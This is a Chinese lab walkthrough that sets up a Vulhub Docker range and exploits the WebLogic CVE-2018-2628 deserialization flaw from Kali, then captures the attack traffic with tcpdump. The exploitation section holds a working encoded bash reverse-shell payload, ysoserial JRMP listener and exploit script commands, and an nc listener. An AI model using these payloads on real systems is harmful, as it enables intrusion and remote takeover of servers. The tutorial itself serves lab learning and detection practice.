## **前期准备**

vmware workstation15

Ubuntu 18.04 192.168.50.157

kali linux 192.168.50.53

##  **开始安装**

vmware workstation15 安装方法如下

    
    
    https://www.ainiseo.com/question/8170.html

Ubuntu 18.04 安装方法如下

    
    
    https://zhuanlan.zhihu.com/p/38797088

docker 安装

    
    
    apt-get install docker*

![](https://image.3001.net/images/20200824/1598241772.png!small)

![](https://image.3001.net/images/20200824/1598241793.png!small)

安装git

    
    
    apt-get install git

安装net-tools

    
    
    apt-get install net-tools

安装成功后查看docker版本

![](https://image.3001.net/images/20200824/1598241855.png!small)

启动docker服务

    
    
    service docker start

修改docker国内镜像源、我们这里使用阿里云源

创建或修改 /etc/docker/daemon.json 文件

    
    
    {       
    "registry-mirrors": ["https://cr.console.aliyun.com"]   
    }
    
    
    Docker中国区官方镜像 https://registry.docker-cn.com 
    网易 http://hub-mirror.c.163.com ustc  
    中国科技大学 https://docker.mirrors.ustc.edu.cn
    阿里云容器  服务 https://cr.console.aliyun.com/

![](https://image.3001.net/images/20200824/1598241883.png!small)

下载Vulhub靶场

    
    
    wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
    unzip vulhub-master.zip
    cd vulhub-master
    

此次我们使用weblogic反序列化漏洞、切换到/vulhub-master/weblogic/CVE-2018-2628

![](https://image.3001.net/images/20200824/1598241937.png!small)

使用docker-compose 下载vulhub下的靶场环境

    
    
    docker-compose up -d

![](https://image.3001.net/images/20200824/1598241969.png!small)

使用docker ps 查看启动进程

![](https://image.3001.net/images/20200824/1598241997.png!small)

如果多个进程同时启动/停止/删除可以用下列命令（其余命令属于扩展）

    
    
    docker start $(docker ps -qa)   #启动所有镜像
    docker stop  $(docker ps -qa) #停止所有镜像
    docker rmi  $(docker ps -qa)  #删除所以镜像
    docker exec -it  id  /bin/bash #进入到一个docker shell下
    docker export -o test.tar 54dc157b2982    #镜像打包 test.tar为你需要打包的文件名 54dc157b2982 为你需要打包的进程ID
    cat test.tar | docker import - test_123 # 导入镜像包到本地
    docker images #查看test_123是否导入成功
    run -it -v /:/mnt --entrypoint /bin/bash ubuntu # 映射宿主机根目录到虚拟机/mnt下
    docker push zhang0908/fudan-consumer1:v1  #将本地镜像上传到Docker Hub（或阿里云Hub）
    docker pull hang0908/fudan-consumer1  #从Docker Hub（或阿里云Hub）、下载镜像到本地
    

在宿主机尝试访问weblogic后台

    
    
    http://192.168.50.157:7001/console/login/LoginForm.jsp

![](https://image.3001.net/images/20200824/1598242023.png!small)

kali linux 安装方法

    
    
    https://blog.csdn.net/qq_41625341/article/details/106152051

ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 工具下载编译

    
    
    git clone https://github.com/brianwrf/ysoserial.git
    cd ysoserial
    mvn clean package -DskipTests

kali linux 默认没有安装mvn 安装方法非常简单方法如下

    
    
    https://blog.csdn.net/weixin_44018338/article/details/98962529

##  **漏洞利用**

使用以下网址对Shell反弹编码转换、转换IP如下192.168.50.53:8888此地址进行转换

    
    
    http://www.jackson-t.ca/runtime-exec-payloads.html

![](https://image.3001.net/images/20200824/1598242052.png!small)

复制地址

    
    
    bash -c {echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguNTAuNTMvODg4OCAgMD4mMQ==}|{base64,-d}|{bash,-i}

切换到我们编译好的ysoserial目录下、执行下面代码来监听JRMP1099端口

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar  ysoserial.exploit.JRMPListener  1099 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguNTAuNTMvODg4OCAgMD4mMQ==}|{base64,-d}|{bash,-i}"
    

![](https://image.3001.net/images/20200824/1598242075.png!small)

下载[https://www.exploit-db.com/exploits/44553 ](https://www.exploit-db.com/exploits/44553)exp脚本下载后重命名为exploit.py

然后通过运行exploit.py 脚本进行攻击获取服务器shell

运行exploit.py 向漏洞主机执行远程代码

    
    
    python exploit.py  192.168.50.157 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.50.53 1099 JRMPClient

![](https://image.3001.net/images/20200824/1598242101.png!small)

在Ubuntu下使用tcpdump -i ens33 -w weblogic.pcap 命令来检测攻击者使用的攻击脚本、执行的命令。

![](https://image.3001.net/images/20200824/1598242125.png!small)

返回kali linux 下用nc 监听8888 端口

    
    
    nc -lvnp 8888 

![](https://image.3001.net/images/20200824/1598242152.png!small)再次返回到Ubuntu系统下
按Ctrl+c 结束tcp抓包、对pcap数据包进行查看

![](https://image.3001.net/images/20200824/1598242178.png!small)

可以看到对方使用主机类型包括执行命令

![](https://image.3001.net/images/20200824/1598242212.png!small)

![](https://image.3001.net/images/20200824/1598242279.png!small)![](https://image.3001.net/images/20200824/1598242292.png!small)

至此结束、没什么技术含量大神勿喷。当然也可以把ens33上行接口做成流量镜像口、然后通过威胁态势感知平台来检测来自各个地方的攻击。

